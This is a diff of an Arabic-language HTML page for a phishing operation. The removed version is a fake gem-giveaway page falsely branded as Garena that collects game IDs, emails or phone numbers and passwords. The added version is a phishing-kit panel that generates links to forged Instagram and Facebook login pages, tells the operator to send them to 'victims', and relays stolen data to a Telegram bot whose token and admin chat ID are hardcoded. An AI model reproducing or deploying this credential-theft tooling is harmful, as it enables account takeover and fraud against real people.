@@ -1,33 +1,63 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gamer Rewards - 2026</title>
+    <title>GamerVault Panel - لوحة التحكم</title>
     <style>
-        body { font-family: sans-serif; background-color: #0b1119; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #162130; padding: 25px; border-radius: 12px; border: 2px solid #ffba08; width: 300px; text-align: center; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
-        h2 { color: #ffba08; margin-bottom: 10px; font-size: 24px; }
-        p { font-size: 14px; color: #ccc; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: none; box-sizing: border-box; background: #fff; color: #333; }
-        button { width: 100%; padding: 12px; background: #ffba08; border: none; border-radius: 6px; color: black; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
-        button:hover { background: #e0a506; }
-        .footer { margin-top: 15px; font-size: 10px; color: #555; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: white; text-align: center; padding: 20px; }
+        .container { max-width: 400px; margin: auto; background: #1e293b; padding: 20px; border-radius: 15px; border: 1px solid #334155; }
+        h2 { color: #38bdf8; }
+        .btn { display: block; width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; text-decoration: none; }
+        .insta { background: #e1306c; color: white; }
+        .fb { background: #1877f2; color: white; }
+        .input-box { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #475569; background: #0f172a; color: white; box-sizing: border-box; }
+        .link-box { background: #334155; padding: 10px; border-radius: 5px; word-break: break-all; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>مبروك! 💎</h2>
-        <p>لقد فزت بـ 2500 جوهرة مجانية. سجل دخولك الآن لتأكيد حسابك واستلامها فوراً.</p>
-        
-        <form action="https://formspree.io/f/YOUR_ID" method="POST">
-            <input type="text" name="player_id" placeholder="ID اللاعب (UID)" required>
-            <input type="text" name="email_or_phone" placeholder="البريد الإلكتروني أو الهاتف" required>
-            <input type="password" name="password" placeholder="كلمة المرور" required>
-            <button type="submit">استلام الجواهر الآن</button>
-        </form>
-        <div class="footer">© 2026 Garena International. All rights reserved.</div>
+
+<div class="container" id="auth">
+    <h2>تسجيل الدخول / إنشاء حساب</h2>
+    <p>أدخل Chat ID الخاص بك لاستلام الضحايا</p>
+    <input type="text" id="userChatId" class="input-box" placeholder="أدخل Telegram Chat ID">
+    <button class="btn fb" onclick="login()">دخول إلى اللوحة</button>
+</div>
+
+<div class="container" id="panel" style="display:none;">
+    <h2>مرحباً بك في اللوحة 🚀</h2>
+    <p>اختر نوع الصفحة لإنشاء رابط خاص بك:</p>
+    <button class="btn insta" onclick="generateLink('Instagram')">رابط Instagram 📸</button>
+    <button class="btn fb" onclick="generateLink('Facebook')">رابط Facebook 🔵</button>
+    
+    <div id="result" class="link-box">
+        <p>رابطك الخاص هو:</p>
+        <code id="finalLink"></code>
+        <p style="font-size: 12px; color: #94a3b8; margin-top: 10px;">انسخ الرابط وأرسله للضحايا. المعلومات ستصلك في البوت.</p>
     </div>
+</div>
+
+<script>
+    const MY_BOT_TOKEN = "8433106897:AAETCVZJn6d-sDFFBGUcbZesj1QLvvPuUo0";
+    const ADMIN_CHAT_ID = "6168661664"; // تأكد من Chat ID ديالك هنا
+
+    function login() {
+        const id = document.getElementById('userChatId').value;
+        if(id.length > 5) {
+            localStorage.setItem('myChatId', id);
+            document.getElementById('auth').style.display = 'none';
+            document.getElementById('panel').style.display = 'block';
+        } else { alert("أدخل ID صحيح"); }
+    }
+
+    function generateLink(type) {
+        const userId = localStorage.getItem('myChatId');
+        const currentUrl = window.location.href.replace('index.html', '');
+        // هاد الرابط غايكون هو صفحة تسجيل الدخول المزورة
+        const link = `${currentUrl}login.html?ref=${userId}&type=${type}`;
+        document.getElementById('result').style.display = 'block';
+        document.getElementById('finalLink').innerText = link;
+    }
+</script>
 </body>
 </html>
